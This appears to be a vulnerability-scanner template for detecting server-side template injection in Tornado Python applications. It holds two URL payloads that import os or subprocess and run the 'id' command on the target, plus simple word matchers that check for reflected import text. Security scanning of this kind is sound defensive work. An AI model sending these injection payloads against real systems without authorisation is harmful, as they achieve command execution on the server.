id: ssti-tornado
info:
  name: SSTI Tornado Template Engine
  author: AniipID
  severity: critical
  description: Detects Tornado template injection in Python apps
  tags: ssti,tornado,python
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={% import os %}{{os.system('id')}}"
      - "{{BaseURL}}?name={% import subprocess %}{{subprocess.check_output('id')}}"
    matchers:
      - type: word
        words:
          - "{% import"
          - "import os"
        condition: or
        name: "tornado-ssti"
